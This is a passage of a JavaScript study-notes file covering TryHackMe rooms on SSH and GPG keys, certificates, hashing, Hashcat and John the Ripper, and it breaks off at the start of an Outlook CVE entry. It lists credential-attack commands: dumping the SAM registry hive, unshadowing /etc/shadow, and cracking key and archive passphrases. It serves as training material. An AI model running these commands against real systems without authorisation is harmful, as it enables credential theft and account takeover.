  ~/.ssh/known_hosts     → fingerprints of servers you've connected to

USING A KEY FILE:
  ssh -i privateKeyFileName user@host

COPYING PUBLIC KEY TO SERVER:
  ssh-copy-id user@server   → installs public key in authorized_keys`,
        commands: [
          'ssh-keygen -t ed25519',
          'ssh-keygen -t rsa -b 4096',
          'ssh -i ~/.ssh/id_rsa user@192.168.1.10',
          'ssh-copy-id user@192.168.1.10',
          '// Fix private key permissions:',
          'chmod 600 id_rsa',
          '// Check key type:',
          'head -1 id_rsa   // shows BEGIN RSA PRIVATE KEY or BEGIN OPENSSH PRIVATE KEY',
          '// CTF: crack SSH key passphrase with John:',
          'ssh2john id_rsa > id_rsa_hash.txt',
          'john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt',
        ],
        answer: "RSA",
      },
      {
        num: 5,
        title: "Digital Signatures and Certificates",
        notes: `DIGITAL SIGNATURES — PURPOSE:
Verify the AUTHENTICITY and INTEGRITY of a digital message or document.

HOW DIGITAL SIGNATURES WORK:
  Signing:
    1. Bob takes his document and creates a HASH of it
    2. Bob ENCRYPTS the hash with his PRIVATE KEY → this is the signature
    3. Bob sends: [original document] + [encrypted hash signature]

  Verification:
    1. Alice DECRYPTS the signature with Bob's PUBLIC KEY → recovers hash
    2. Alice calculates the hash of the received document herself
    3. If both hashes MATCH → document is authentic and unmodified

WHY DIGITAL SIGNATURES BEAT IMAGE SIGNATURES:
  → Pasting an image of a signature proves NOTHING
  → Anyone can copy/paste an image
  → Digital signature proves: (1) who signed it, (2) content wasn't changed

CERTIFICATES — PURPOSE:
Prove the identity of a server (used in HTTPS, TLS).

CERTIFICATE CHAIN OF TRUST:
  Root CA (Certificate Authority)
    → Intermediate CA
      → Server Certificate (e.g. for tryhackme.com)
  Your browser/OS comes pre-installed with trusted Root CA certificates.
  The chain must trace back to a trusted Root CA for the cert to be valid.

CERTIFICATE AUTHORITIES (CAs):
  → Commercial: DigiCert, Sectigo, GlobalSign (paid annual fee)
  → Free: Let's Encrypt → free TLS certificates for websites
  → Self-signed → NOT trusted by browsers (no third-party verification)

TLS CERTIFICATE USE CASES:
  HTTPS websites → server proves it is who it claims to be
  Code signing   → software vendor proves the software hasn't been tampered with
  Email signing  → sender proves authenticity of email`,
        commands: [
          '// Generate self-signed certificate (for testing only):',
          'openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes',
          '// View certificate details:',
          'openssl x509 -in cert.pem -text -noout',
          '// Check certificate of a website:',
          'openssl s_client -connect tryhackme.com:443 | openssl x509 -noout -text',
        ],
        answer: "Certificate",
      },
      {
        num: 6,
        title: "PGP and GPG",
        notes: `PGP (Pretty Good Privacy):
Software that implements encryption for files, email, and digital signing.

GPG (GnuPG — GNU Privacy Guard):
Open-source implementation of the OpenPGP standard. Commonly used for:
  → Encrypting email messages (confidentiality)
  → Signing email messages (authenticity + integrity)
  → Encrypting files and backups

GENERATING A GPG KEY:
  gpg --full-gen-key
  → Prompts for: key type (RSA, ECC, etc.), expiry, name, email, passphrase

GPG COMMON OPERATIONS:
  gpg --import backup.key           → import a key from file
  gpg --export -a "Name" > pub.key  → export your public key
  gpg --decrypt file.gpg            → decrypt a file
  gpg --encrypt -r "recipient" file → encrypt a file for a recipient
  gpg --sign file                   → sign a file with your private key
  gpg --verify file.sig             → verify a digital signature

CTF USE CASES:
  → Decrypt files encrypted with GPG
  → Crack GPG key passphrases with John the Ripper:
    gpg2john private.key > gpg_hash.txt
    john --wordlist=rockyou.txt gpg_hash.txt

BACKUP AND RESTORE:
  → Export keys for backup: gpg --export-secret-keys -a "Name" > backup.key
  → Import on new machine: gpg --import backup.key
  → Then: gpg --decrypt message.gpg → decrypts with imported key`,
        commands: [
          'gpg --full-gen-key',
          'gpg --import backup.key',
          'gpg --decrypt confidential_message.gpg',
          'gpg --encrypt -r "recipient@email.com" file.txt',
          '// CTF: crack GPG passphrase:',
          'gpg2john private.key > gpg_hash.txt',
          'john --wordlist=/usr/share/wordlists/rockyou.txt gpg_hash.txt',
          '// List all keys:',
          'gpg --list-keys',
          'gpg --list-secret-keys',
        ],
        answer: "Pineapple",
      },
    ],
    tools: ["Python3", "ssh-keygen", "ssh-copy-id", "openssl", "gpg", "gpg2john", "RsaCtfTool"],
    mitre: [
      "T1552.004 — Unsecured Credentials: Private Keys",
      "T1573 — Encrypted Channel",
      "T1600 — Weaken Encryption",
    ],
    personalNotes:
      "RSA CTF variables to always find: p, q, n, e, d, c. If given p and q → n=p*q, phi=(p-1)*(q-1). DH shared secret = g^(ab) mod p. SSH private key permissions MUST be 600. Let's Encrypt = free TLS certs. GPG decrypt command: gpg --decrypt file.gpg.",
  },

  // ─────────────────────────────────────────────────────────
  {
    id: "hashing-basics",
    title: "Hashing Basics",
    platform: "TryHackMe",
    category: "Cryptography",
    difficulty: "Easy",
    icon: "#️⃣",
    completed: true,
    tags: ["Hashing", "MD5", "SHA1", "SHA256", "Bcrypt", "Rainbow Tables", "Salt", "HMAC", "Hashcat", "Password Cracking"],
    overview:
      "Learn about hash functions and their critical roles in security. Covers hash function properties, the pigeonhole effect and collisions, insecure password storage (plaintext, Adobe breach, LinkedIn SHA-1 breach), secure password storage with salts, recognizing Linux/Windows password hash formats, cracking hashes with Hashcat, and using HMAC for integrity checking.",
    keyLearnings: [
      "Hash function: arbitrary input → fixed-size output; one-way (cannot reverse without brute-force)",
      "Single bit change in input causes SIGNIFICANT change in output (avalanche effect)",
      "MD5 = 16 bytes (128-bit) output | SHA1 = 20 bytes | SHA256 = 32 bytes | SHA512 = 64 bytes",
      "MD5 and SHA1 are INSECURE — collisions can be engineered (do not use for passwords)",
      "Collision: two different inputs produce the same hash output — unavoidable but should be infeasible",
      "Rainbow table: precomputed hash→password lookup table — defeated by using SALT",
      "Salt = random value added to password before hashing — unique per user — stops rainbow tables",
      "Secure password hashing algorithms: Argon2, Scrypt, Bcrypt, PBKDF2 (all handle salt automatically)",
      "Linux /etc/shadow format: $prefix$options$salt$hash (e.g. $y$ = yescrypt default)",
      "Windows NTLM hashes stored in SAM database — dump with Mimikatz",
      "hashcat -m 3200 -a 0 hash.txt rockyou.txt → crack Bcrypt with wordlist",
      "HMAC = hash + secret key → proves authenticity AND integrity",
    ],
    tasks: [
      {
        num: 1,
        title: "Hash Functions",
        notes: `HASH FUNCTION — DEFINITION:
Takes input data of ANY size and produces a FIXED-SIZE output (digest/hash value).

PROPERTIES OF GOOD HASH FUNCTIONS:
  1. DETERMINISTIC → same input always gives same output
  2. FIXED OUTPUT → output size is always the same regardless of input size
  3. ONE-WAY → computationally infeasible to reverse (get input from output)
  4. AVALANCHE EFFECT → even 1 bit change in input → significant change in output
  5. FAST to compute → slow to reverse (intentional asymmetry)

AVALANCHE EFFECT DEMONSTRATION:
  file1.txt contains: T (0x54 = 01010100)
  file2.txt contains: U (0x55 = 01010101) → differs by only 1 bit!
  MD5: file1 = b9ece18c... | file2 = 4c614360... → completely different
  SHA256: file1 = e632b7... | file2 = a25513c7... → completely different

COMMON HASH ALGORITHM OUTPUT SIZES:
  MD5     → 128 bits = 16 bytes  = 32 hex characters
  SHA1    → 160 bits = 20 bytes  = 40 hex characters
  SHA256  → 256 bits = 32 bytes  = 64 hex characters
  SHA512  → 512 bits = 64 bytes  = 128 hex characters

ENCODING OF OUTPUT:
  → Raw bytes are usually encoded as HEXADECIMAL for display
  → Each raw byte = 2 hex digits (e.g. 16 bytes MD5 = 32 hex chars)
  → Sometimes encoded as Base64

HASH COLLISIONS:
  → Two different inputs producing the SAME hash output
  → Mathematically UNAVOIDABLE (pigeonhole principle): more inputs than outputs
  → Good algorithms make collisions computationally infeasible to engineer
  → MD5 and SHA1: collisions CAN be engineered → INSECURE`,
        commands: [
          '// Calculate hashes on Linux:',
          'md5sum file.txt',
          'sha1sum file.txt',
          'sha256sum file.txt',
          'sha512sum file.txt',
          '// Hash a string directly:',
          'echo -n "password" | md5sum',
          'echo -n "password" | sha256sum',
          '// Python hashing:',
          'python3 -c "import hashlib; print(hashlib.sha256(b\'hello\').hexdigest())"',
        ],
        answer: null,
      },
      {
        num: 2,
        title: "Insecure Password Storage",
        notes: `THREE INSECURE PRACTICES FOR PASSWORD STORAGE:

1. STORING PLAINTEXT PASSWORDS:
   → RockYou.com breach (2009) → 14+ million passwords leaked in plaintext
   → rockyou.txt now ships with Kali: /usr/share/wordlists/rockyou.txt
   → Contains common passwords like: 123456, password, iloveyou, princess

2. STORING WITH DEPRECATED ENCRYPTION:
   → Adobe breach → used DES3 encryption instead of a proper hash
   → Password hints stored in plaintext (sometimes containing the password!)
   → Encryption can be REVERSED with the key → not suitable for password storage

3. STORING WITH INSECURE HASH (no salt):
   → LinkedIn breach (2012) → used SHA-1 to store passwords
   → NO SALTING used → all users with the same password had the same hash
   → Enabled rainbow table attacks → cracked millions of passwords quickly

WHY NOT ENCRYPT PASSWORDS?
   → Encryption is REVERSIBLE if you have the key
   → If key is compromised → ALL passwords immediately exposed
   → Hashing is ONE-WAY → attacker must crack each hash individually

ROCKYOU.TXT QUICK FACTS:
   → Location: /usr/share/wordlists/rockyou.txt (Kali, Parrot, AttackBox)
   → Lines: ~14.3 million passwords
   → Source: 2009 RockYou social media company data breach
   → 20th password in the list: qwerty`,
        commands: [
          '// Count lines in rockyou.txt:',
          'wc -l /usr/share/wordlists/rockyou.txt',
          '// View first 20 passwords:',
          'head -20 /usr/share/wordlists/rockyou.txt',
          '// View specific line:',
          'sed -n "20p" /usr/share/wordlists/rockyou.txt',
        ],
        answer: "qwerty",
      },
      {
        num: 3,
        title: "Secure Password Storage with Salts",
        notes: `RAINBOW TABLE ATTACK:
  → Precomputed table of hash values → plaintext passwords
  → If no salt: look up the hash → instantly find password
  → Sites like CrackStation.net use massive rainbow tables
  → Defeated by adding a unique SALT to each password

WHAT IS A SALT?
  → A randomly generated value added to a password BEFORE hashing
  → Stored alongside the hash value in the database
  → Must be UNIQUE per user → different hash even if same password
  → Salts do NOT need to be kept secret
  → With salt: same password + different salt = completely different hash

SECURE PASSWORD STORAGE PROCESS:
  1. Select secure hashing algorithm: Argon2, Scrypt, Bcrypt, or PBKDF2
  2. Generate unique random salt for this user: e.g. Y4UV*^(=go_!
  3. Concatenate: password + salt = AL4RMc10kY4UV*^(=go_!
  4. Calculate hash of the combined string
  5. Store: [hash value] + [salt used]

SECURE HASHING ALGORITHMS (handles salt automatically):
  Argon2    → current recommended standard (winner of Password Hashing Competition)
  Scrypt    → memory-hard; resistant to GPU/ASIC attacks
  Bcrypt    → based on Blowfish cipher; slow by design; GPU gives no advantage
  PBKDF2    → NIST recommended; used in many standards (WPA2, etc.)

NOTE: bcrypt and scrypt are INTENTIONALLY SLOW — this slows down attackers.
GPU cracking doesn't help much against bcrypt (designed for CPU).

WHY NOT ENCRYPT PASSWORDS (reminder):
  → Encryption = reversible with key → key compromise = all passwords exposed
  → Hashing = one-way → attacker must crack each hash individually`,
        commands: [
          '// Generate bcrypt hash in Python:',
          'python3 -c "import bcrypt; pw=b\'password\'; salt=bcrypt.gensalt(); print(bcrypt.hashpw(pw, salt))"',
          '// Verify bcrypt hash:',
          'python3 -c "import bcrypt; print(bcrypt.checkpw(b\'password\', b\'HASH_HERE\'))"',
          '// Generate Argon2 hash:',
          'python3 -c "from argon2 import PasswordHasher; ph=PasswordHasher(); print(ph.hash(\'password\'))"',
        ],
        answer: "inS3CyourP4$$",
      },
      {
        num: 4,
        title: "Recognising Password Hashes",
        notes: `LINUX PASSWORDS (/etc/shadow):
  Format: $prefix$options$salt$hash
  Location: /etc/shadow (root-readable only)
  Old location: /etc/passwd (readable by all — now just uses 'x' placeholder)

LINUX HASH PREFIXES (in order of strength, strongest first):
  $y$    → yescrypt    → DEFAULT in modern Linux (256-bit output)
  $gy$   → gost-yescrypt → uses GOST R 34.11-2012 hash function
  $7$    → scrypt       → memory-hard
  $2b$, $2y$, $2a$, $2x$ → bcrypt (Blowfish-based)
  $6$    → sha512crypt  → SHA-512 based; common in older Linux
  $md5   → SunMD5       → Solaris
  $1$    → md5crypt     → MD5 based; FreeBSD origin; very insecure now

EXAMPLE /etc/shadow ENTRY:
  strategos:$y$j9T$76UzfgEM5Pny...RyNJTmTMJq9:19965:0:99999:7:::
  → Parts: username:$algorithm$options$salt$hash:last_change:...
  → $y$ = yescrypt | j9T = parameter | 76Uzfg... = salt | /OOSg... = hash

WINDOWS PASSWORDS:
  → Hash type: NTLM (variant of MD4)
  → Stored in: SAM (Security Accounts Manager) database
  → SAM location: C:\Windows\System32\config\SAM
  → To dump: use Mimikatz or similar (requires admin/SYSTEM)
  → Also stored in NTDS.dit (Active Directory database) on DCs
  → NTLM hashes look identical to MD4/MD5 → use CONTEXT to determine type

HASH IDENTIFICATION TOOLS:
  hashID (Python) → prefix-based identification (reliable for prefixed hashes)
  hash-identifier → more options, lists probabilities
  Hashcat example hashes page → reference for all supported hash modes

WINDOWS NOTE: Split into NT hash and LM hash.
  LM hash → legacy, very weak (passwords split into 7-char chunks)
  NT hash → NTLM → MD4 of UTF-16LE encoded password`,
        commands: [
          '// View /etc/shadow (requires root):',
          'sudo cat /etc/shadow',
          '// Identify hash type with hashID:',
          'hashid -m HASH_HERE',
          '// Or use hash-identifier:',
          'python3 hash-id.py',
          '// On Windows, dump SAM hashes (requires admin):',
          '// reg save HKLM\\SAM sam.bak',
          '// reg save HKLM\\SYSTEM system.bak',
          '// Then use secretsdump.py or Mimikatz',
        ],
        answer: null,
      },
      {
        num: 5,
        title: "Password Cracking with Hashcat",
        notes: `CRACKING METHODS:

DICTIONARY ATTACK:
  → Hash a large wordlist and compare each hash to target
  → If they match → you know the plaintext
  → Tools: Hashcat, John the Ripper

RAINBOW TABLE:
  → Precomputed hash→plaintext lookup table
  → Only works if NO SALT is used
  → Online tools: CrackStation.net, Hashes.com

HASHCAT BASIC SYNTAX:
  hashcat -m <hash_type> -a <attack_mode> hashfile wordlist

  -m <hash_type>   → hash mode number (see examples page)
  -a <attack_mode> → 0 = straight (wordlist), 3 = brute-force mask
  hashfile         → file containing the hash to crack
  wordlist         → password list to try

COMMON HASH MODE NUMBERS:
  0     → MD5
  100   → SHA1
  1400  → SHA2-256
  1700  → SHA2-512
  1000  → NTLM (Windows)
  3200  → bcrypt ($2*$, Blowfish)
  1800  → sha512crypt ($6$, Unix)
  400   → phpass (WordPress)
  2410  → Cisco-ASA MD5
  1750  → HMAC-SHA512 (key = $pass)

EXAMPLES:
  hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt  → crack bcrypt
  hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt  → crack NTLM
  hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt  → crack sha512crypt

GPU vs CPU:
  → GPUs have thousands of cores → much faster for most hash types
  → Bcrypt/Scrypt → designed so GPU gives NO speed advantage
  → Run Hashcat on HOST system (not VM) for best GPU performance
  → John the Ripper uses CPU by default → works fine in VMs`,
        commands: [
          'hashcat -m 0 -a 0 md5_hash.txt /usr/share/wordlists/rockyou.txt',
          'hashcat -m 100 -a 0 sha1_hash.txt /usr/share/wordlists/rockyou.txt',
          'hashcat -m 1400 -a 0 sha256_hash.txt /usr/share/wordlists/rockyou.txt',
          'hashcat -m 3200 -a 0 bcrypt_hash.txt /usr/share/wordlists/rockyou.txt',
          'hashcat -m 1000 -a 0 ntlm_hash.txt /usr/share/wordlists/rockyou.txt',
          '// List all supported hash modes:',
          'hashcat --list-modes',
          '// List formats and grep for a type:',
          'hashcat --list-modes | grep -i bcrypt',
          '// Check cracking progress:',
          'hashcat --status',
        ],
        answer: null,
      },
      {
        num: 6,
        title: "Hashing for Integrity + HMAC",
        notes: `USING HASH FOR INTEGRITY CHECKING:
  → Hash function of the SAME data = SAME hash always
  → If even 1 bit changes → hash changes significantly (avalanche effect)
  → Use: verify downloaded files are identical to originals

PRACTICAL EXAMPLES:
  → Linux ISOs: sha256sum fedora.iso → compare with published hash
  → File downloads: check MD5/SHA256 against vendor's published value
  → Finding duplicate files: same hash = same file content
  → Forensics: hash drives before/after analysis to prove integrity

EXAMPLE: Fedora ISO verification
  sha256sum Fedora-Workstation-Live-x86_64-40-1.14.iso
  → Compare output with value in Fedora-Workstation-40-CHECKSUM file
  → If they match → download is authentic and complete

─── HMAC (Hash-based Message Authentication Code) ───

PURPOSE: Verify AUTHENTICITY and INTEGRITY of data simultaneously.
Uses: cryptographic hash function + SECRET KEY.

WHAT HMAC PROVES:
  AUTHENTICITY  → the sender knew the secret key (proves identity)
  INTEGRITY     → the message hasn't been modified or corrupted

HOW HMAC WORKS (simplified):
  1. Secret key is padded to hash function's block size
  2. Two XOR operations with constants (ipad and opad)
  3. Hash of (XORed_key || message) → H1
  4. Hash of (XORed_key || H1) → final HMAC
  Formula: HMAC(K,M) = H((K⊕opad)||H((K⊕ipad)||M))

USE CASES:
  → API authentication (HMAC-SHA256 signatures in AWS, etc.)
  → TLS record authentication
  → JWT tokens (JSON Web Tokens) authentication`,
        commands: [
          '// Verify file integrity:',
          'sha256sum downloaded_file.iso',
          '// Compare with known hash:',
          'echo "EXPECTED_HASH  filename" | sha256sum -c',
          '// HMAC in Python:',
          'python3 -c "import hmac, hashlib; key=b\'secret\'; msg=b\'message\'; print(hmac.new(key, msg, hashlib.sha256).hexdigest())"',
          '// Check hashcat mode for HMAC-SHA512:',
          '// hashcat mode 1750 = HMAC-SHA512 (key = $pass)',
        ],
        answer: null,
      },
    ],
    tools: ["Hashcat", "John the Ripper", "hashid", "hash-identifier", "sha256sum", "md5sum"],
    mitre: [
      "T1110.002 — Password Cracking",
      "T1003.001 — OS Credential Dumping: LSASS Memory",
      "T1003.002 — OS Credential Dumping: SAM",
    ],
    personalNotes:
      "Hash size memory trick: MD5=16 bytes (128-bit), SHA1=20 bytes, SHA256=32 bytes, SHA512=64 bytes. Linux shadow prefix order (strongest→weakest): $y$ yescrypt → $7$ scrypt → $2b$ bcrypt → $6$ sha512crypt → $1$ md5crypt. Hashcat mode 3200=bcrypt, 1000=NTLM, 1400=SHA256, 0=MD5. Rainbow tables = defeated by salt.",
  },

  // ─────────────────────────────────────────────────────────
  {
    id: "john-the-ripper-basics",
    title: "John the Ripper: The Basics",
    platform: "TryHackMe",
    category: "Cryptography",
    difficulty: "Easy",
    icon: "🔨",
    completed: true,
    tags: ["John the Ripper", "Hash Cracking", "NTLM", "Shadow File", "zip2john", "rar2john", "ssh2john", "Wordlists"],
    overview:
      "Learn how to use John the Ripper (Jumbo John) for hash cracking. Covers automatic and format-specific hash cracking, Windows NTLM hashes, Linux /etc/shadow with unshadow, single crack mode (word mangling), custom rules, and cracking password-protected Zip/RAR archives and SSH private keys.",
    keyLearnings: [
      "John the Ripper = popular versatile hash cracking tool; use Jumbo John for full features",
      "Basic syntax: john --wordlist=[wordlist] [hashfile]",
      "Specify format: john --format=raw-md5 --wordlist=rockyou.txt hash.txt",
      "Standard hash formats need 'raw-' prefix: raw-md5, raw-sha1, raw-sha256",
      "NTLM format flag: --format=nt (no 'raw-' prefix needed)",
      "unshadow combines /etc/passwd + /etc/shadow before cracking",
      "Single crack mode: john --single --format=[format] file.txt (prepend username: mike:HASH)",
      "zip2john → rar2john → ssh2john: convert protected files to crackable hashes",
      "Custom rules defined in /etc/john/john.conf under [List.Rules:RuleName]",
      "rockyou.txt = 14+ million passwords from 2009 RockYou.com breach",
    ],
    tasks: [
      {
        num: 1,
        title: "Basic Hash Cracking",
        notes: `JOHN BASIC SYNTAX:
  john [options] [file_path]

AUTOMATIC CRACKING (John detects hash type):
  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

FORMAT-SPECIFIC CRACKING:
  john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
  john --format=raw-sha1 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
  john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

NOTE ON FORMATS:
  Standard hash types need "raw-" prefix: raw-md5, raw-sha1, raw-sha256
  Some types don't need it: nt (NTLM), md5crypt, sha512crypt
  Check all formats: john --list=formats
  Find your hash type: john --list=formats | grep -iF "md5"

IDENTIFYING HASH TYPES:
  hash-identifier → download hash-id.py and run with python3
  hashid          → use hashid -m HASH for Hashcat mode too
  Online tool: https://hashes.com/en/tools/hash_identifier

VIEWING CRACKED PASSWORDS:
  john --show hash.txt   → displays all cracked hashes for a file

HASH TYPE QUICK REFERENCE:
  MD5     → 32 hex chars | John: raw-md5
  SHA1    → 40 hex chars | John: raw-sha1
  SHA256  → 64 hex chars | John: raw-sha256
  Whirlpool → 128 hex chars | John: whirlpool
  NTLM    → 32 hex chars (looks like MD5) | John: nt

ROCKYOU.TXT LOCATION:
  /usr/share/wordlists/rockyou.txt (Kali, AttackBox)
  SecLists: /Passwords/Leaked-Databases/rockyou.txt.tar.gz`,
        commands: [
          '// Auto-detect and crack:',
          'john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt',
          '// Format-specific:',
          'john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt',
          'john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt',
          '// Show cracked passwords:',
          'john --show hash.txt',
          '// List all formats:',
          'john --list=formats',
          'john --list=formats | grep -iF "sha512"',
          '// Identify hash type:',
          'python3 hash-id.py',
        ],
        answer: null,
      },
      {
        num: 2,
        title: "Cracking Windows NTLM Hashes",
        notes: `NTLM / NTHASH — BACKGROUND:
  → Format used by modern Windows to store user and service passwords
  → Also called NTHash or NTLM (references older LM format)
  → NTHash = MD4 hash of the password in UTF-16LE encoding
  → Stored in: SAM (Security Accounts Manager) database
  → SAM location: C:\\Windows\\System32\\config\\SAM

HOW TO OBTAIN NTLM HASHES:
  1. Dump SAM database using Mimikatz (requires admin/SYSTEM)
  2. Access the Active Directory NTDS.dit database on a DC
  3. Use volume shadow copy or registry export

FORMAT FLAG FOR JOHN:
  --format=nt  (NOT raw-md5, even though NTLM looks like MD4/MD5)

CRACKING COMMAND:
  john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt ntlm.txt

PASS THE HASH ATTACK:
  → NTLM hashes can sometimes be used WITHOUT cracking
  → "Pass the Hash" — authenticate using the hash directly
  → Tools: impacket, pth-winexe, CrackMapExec
  → Cracking is an alternative if PtH doesn't work

HISTORY OF NT DESIGNATION:
  → NT = New Technology (Windows NT line)
  → Not built from MS-DOS
  → Became the standard Windows OS type
  → "NT" lives on in NTLM, NTFS, NT hash names`,
        commands: [
          '// Crack NTLM hash:',
          'john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt ntlm.txt',
          '// Show cracked:',
          'john --show --format=nt ntlm.txt',
          '// Hashcat equivalent (mode 1000 = NTLM):',
          'hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt',
        ],
        answer: "mushroom",
      },
      {
        num: 3,
        title: "Cracking /etc/shadow with unshadow",
        notes: `/etc/SHADOW OVERVIEW:
  → Stores password hashes for all Linux user accounts
  → Only readable by ROOT
  → Format per line: username:$prefix$options$salt$hash:last_change:min:max:warn:...

WHY UNSHADOW IS NEEDED:
  John needs BOTH /etc/passwd (usernames/structure) AND /etc/shadow (hashes)
  combined into a single file to crack them correctly.

UNSHADOW TOOL:
  unshadow [passwd_file] [shadow_file] > output_file

  Example:
  unshadow local_passwd local_shadow > unshadowed.txt

CRACKING THE COMBINED FILE:
  john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt

MINIMUM FILES NEEDED:
  You don't need full files — you can use just the relevant LINES:
  FILE 1 (local_passwd): root:x:0:0::/root:/bin/bash
  FILE 2 (local_shadow): root:$6$2nwjN454g.dv4HN/$m9Z/...

TYPICAL WORKFLOW:
  1. Gain root access to target machine
  2. Copy /etc/passwd and /etc/shadow to your attacking machine
  3. unshadow passwd shadow > unshadowed.txt
  4. john --wordlist=rockyou.txt unshadowed.txt
  5. john --show unshadowed.txt → see cracked passwords`,
        commands: [
          '// Combine files:',
          'unshadow /etc/passwd /etc/shadow > unshadowed.txt',
          '// Or with specific lines:',
          'unshadow local_passwd local_shadow > unshadowed.txt',
          '// Crack:',
          'john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt',
          '// With explicit format:',
          'john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt',
          '// Show results:',
          'john --show unshadowed.txt',
        ],
        answer: "1234",
      },
      {
        num: 4,
        title: "Single Crack Mode and Custom Rules",
        notes: `─── SINGLE CRACK MODE ───

PURPOSE: John generates a wordlist from the USERNAME and tries variations.
This exploits the common pattern of people basing passwords on their own name.

WORD MANGLING EXAMPLES (username: "Markus"):
  Markus1, Markus2, Markus3   (appending numbers)
  MArkus, MARkus, MARKus      (varying capitalisation)
  Markus!, Markus$, Markus*   (appending symbols)

SYNTAX:
  john --single --format=[format] [file.txt]

⚠ FILE FORMAT FOR SINGLE MODE:
  Must prepend the hash with the username:
  Normal:       1efee03cdcb96d90ad48ccc7b8666033
  Single mode:  mike:1efee03cdcb96d90ad48ccc7b8666033

GECOS FIELD:
  → John also uses the GECOS field from /etc/passwd (full name, info)
  → 5th colon-separated field in /etc/passwd
  → Additional context for word mangling

─── CUSTOM RULES ───

PURPOSE: Define your own password mutation rules based on known password patterns.
Common pattern: Capitalise first letter + add number + add symbol at end
Example target: Polopassword1!

DEFINING RULES IN /etc/john/john.conf:
  [List.Rules:PoloPassword]
  cAz"[0-9][!£$%@]"

RULE COMPONENTS:
  c      → Capitalise the first letter
  Az     → Append to the end of the word
  A0     → Prepend to the start of the word
  [0-9]  → Include a number 0-9
  [A-Z]  → Include uppercase letters
  [a-z]  → Include lowercase letters
  [!£$%@] → Include one of these symbols

CALLING A CUSTOM RULE:
  john --wordlist=rockyou.txt --rule=PoloPassword hash.txt

WHAT CUSTOM RULES EXPLOIT:
  "Password complexity predictability" — users tend to put capitals at start, numbers and symbols at end`,
        commands: [
          '// Single crack mode (prepend username to hash first!):',
          '// File content: joker:HASHVALUE',
          'john --single --format=raw-md5 hash_with_username.txt',
          '// Custom rule (after adding to john.conf):',
          'john --wordlist=/usr/share/wordlists/rockyou.txt --rule=THMRules hash.txt',
          '// Example custom rule in john.conf:',
          '// [List.Rules:THMRules]',
          '// cAz"[0-9][!£$%@]"',
          '// Show john.conf location:',
          'john --config 2>&1 | head -5',
          '// Default config location:',
          'cat /etc/john/john.conf | grep -A2 "List.Rules:Jumbo"',
        ],
        answer: "Jok3r",
      },
      {
        num: 5,
        title: "Cracking Zip, RAR, and SSH Keys",
        notes: `GENERAL PATTERN FOR ALL FILE TYPES:
  1. Use conversion tool to extract hash from protected file
  2. Feed extracted hash to John with rockyou.txt wordlist

─── ZIP FILES (zip2john) ───

  zip2john [zip_file] > zip_hash.txt
  john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt

  Example:
  zip2john secure.zip > zip_hash.txt
  john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
  john --show zip_hash.txt   → see password + extract contents

─── RAR ARCHIVES (rar2john) ───

  rar2john [rar_file] > rar_hash.txt
  john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt

  On AttackBox: /opt/john/rar2john rarfile.rar > rar_hash.txt

─── SSH PRIVATE KEYS (ssh2john) ───

  Crack the PASSPHRASE protecting an id_rsa file.
  (NOT the SSH password itself — the passphrase that decrypts the key file)

  ssh2john [id_rsa_file] > id_rsa_hash.txt
  john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt

  On Kali: python /usr/share/john/ssh2john.py id_rsa > id_rsa_hash.txt
  On AttackBox: python3 /opt/john/ssh2john.py id_rsa > id_rsa_hash.txt

TOOL AVAILABILITY CHECK:
  which zip2john   → check if installed
  ls /opt/john/    → check AttackBox tools directory`,
        commands: [
          '// ZIP cracking:',
          'zip2john secure.zip > zip_hash.txt',
          'john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt',
          'john --show zip_hash.txt',
          '// RAR cracking:',
          '/opt/john/rar2john secure.rar > rar_hash.txt',
          'john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt',
          '// SSH key cracking:',
          'ssh2john id_rsa > id_rsa_hash.txt',
          '// OR on Kali:',
          'python /usr/share/john/ssh2john.py id_rsa > id_rsa_hash.txt',
          'john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt',
          'john --show id_rsa_hash.txt',
        ],
        answer: "mango",
      },
    ],
    tools: ["John the Ripper (Jumbo John)", "zip2john", "rar2john", "ssh2john", "unshadow", "hash-identifier"],
    mitre: [
      "T1110.002 — Brute Force: Password Cracking",
      "T1552.004 — Unsecured Credentials: Private Keys",
      "T1003.008 — OS Credential Dumping: /etc/passwd and /etc/shadow",
    ],
    personalNotes:
      "John workflow: identify hash type → choose format → john --format=X --wordlist=rockyou.txt hash.txt → john --show hash.txt. NTLM = --format=nt (no raw- prefix). Single crack mode = prepend username:hash in file. Conversion tools: zip2john, rar2john, ssh2john, gpg2john, unshadow. Always check /opt/john/ on AttackBox for tools.",
  },

  // ─────────────────────────────────────────────────────────
  {
    id: "moniker-link-cve-2024-21413",
    title: "Moniker Link (CVE-2024-21413)",
    platform: "TryHackMe",
    category: "Web Security",
    difficulty: "Easy",
    icon: "📧",
    completed: true,
    tags: ["CVE", "Outlook", "NTLM", "Credential Leak", "Moniker Link", "Responder", "netNTLMv2", "SMB"],
    overview:
